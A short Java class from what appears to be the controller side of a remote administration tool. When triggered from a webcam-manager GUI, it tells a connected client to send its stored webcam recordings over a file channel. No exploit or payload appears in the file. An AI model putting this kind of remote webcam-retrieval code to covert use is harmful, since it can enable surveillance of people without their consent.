package TableUtils.WebcamManager.Events;

import Server.BytesChannel;
import Packets.Identificators.Category;
import TableUtils.WebcamManager.WebcamGUI;
import Utilities.AbstractEventGUI;
import org.json.JSONObject;

import java.io.IOException;

public class SaveRecordEvent extends AbstractEventGUI<WebcamGUI> {
    public SaveRecordEvent(WebcamGUI webcamGUI) {
        super(webcamGUI);
    }

    @Override
    public void run() {
        BytesChannel bytesChannel = getClient().createFileChannel(Category.WEBCAM_LOGS);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", "SEND_WEBCAM_RECORDS");
        jsonObject.put("channel_id", bytesChannel.getId());
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
